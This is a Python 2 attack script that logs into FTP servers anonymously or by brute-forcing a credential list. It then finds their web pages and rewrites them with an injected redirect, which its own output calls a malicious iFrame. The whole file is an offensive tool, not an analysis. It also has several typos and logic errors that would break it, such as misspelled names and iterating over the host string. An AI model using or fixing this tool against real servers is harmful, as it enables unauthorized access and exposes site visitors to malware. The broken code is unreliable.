#!/usr/bin/python
#-*-coding utf-8-*-
import optparse, time, ftplib

def anonLogin(hostName):
	try:
		ftp = ftplib.FTP(hostName)
		ftp.login('anonymous', 'me@your.com')
		print '\n[*]' + str(hostName) + 'Anonymous Login successful'
		ftp.quit()
		return True
	except Exception, e:
		print '\n Anonymous Login Failed'
		return False

def bruteLogin(hostName, passwdFile):
	passFile = open(passwdFile, 'r')
	for line in passFile.readlines():
		time.sleep(1)
		userName = line.split(':')[0]
		passWord = line.split(':')[1].strip('\r').strip('\n')
		print '[+] Trying '+userName+ 'with '+passWord

		try:
			ftp = ftplib.FTP(hostName)
			ftp.login(userName,passWord)
			print '\n[*]' + str(hostName) + 'FTP Login successful' + userName + passWord
			ftp.quit()
			return (userName,passWord)

		except Exception, e:
			pass
	return (None,None)

def returnDefault(ftp):
	try:
		dirList = ftp.nlst()

	except:
		dirList = []
		print '[-] Could not list directories'
		print '[-] Skipping to the next target'
		return

	retList = []
	for fileName in dirList:
		fn = fileName.lower()
		if '.php' in fn or '.htm' in fn or '.asp' in fn:
			print '[+]Found default page:' + fileName
			retList.append(fileName)

	return retList

def injectPage(ftp,page,redirect):
	f  = open(page + '.tmp', 'w')
	ftp.retrlines('RETR ' + page, f.write)
	print '[+]Download Page: ' + page
	f.write(redirect)
	f.close()
	print '[+] Injectded malicious iFrame on: ' + page
	ftp.storelines('STOR' + page, oepn(page + '.tmp'))
	print '[+] Uploaded Injected Page' + page

def attack(username, password, tgtHost, redirect):
	ftp = ftplib.FTP(tgtHost)
	ftp.login(username, password)
	defPages = returnDefault(ftp)
	for defPag in defPages:
		injectPage(ftp, defPage, redirect)


def main():
	parser = optparse.OptionParser('usage%prog' + '-H<traget host(s)> -r <redirect> [-f<userpass file>]')

	parser.add_option('-H', dest='tgtHosts', type='string', help='specify target host')
	parser.add_option('-f', dest='passwdFile', type='string', help='specify password file(s)')
	parser.add_option('-r',dest='redirect', type='string', help='specify the redirect')

	(options, args) = parser.parse_args()
	tgtHosts = options.tgtHosts
	passFile = options.passwdFile
	redirect = options.redirect

	if tgtHosts == None or passwdFile == None or redirect == None:
		print parser.usage
		exit(0)

	for tgtHost in tgtHosts:
		usename = None
		password = None

		if anonLogin(tgtHost) == True:
			username = 'anonymous'
			password = 'me@your.com'

			print '[+] Using Anoonymous Creds to Attack'
			attack(username, password, tgtHost, redirect)

		elif passwdFile != None:
			(username, paswword ) = bruteLogin(tgtHost, passwdFile)

			if password != None:
				print '[+] Using credentials' + username + password + 'to attack'
				attack(username, password, tgtHost,redirect)


if __name__ == '__main__':
	main()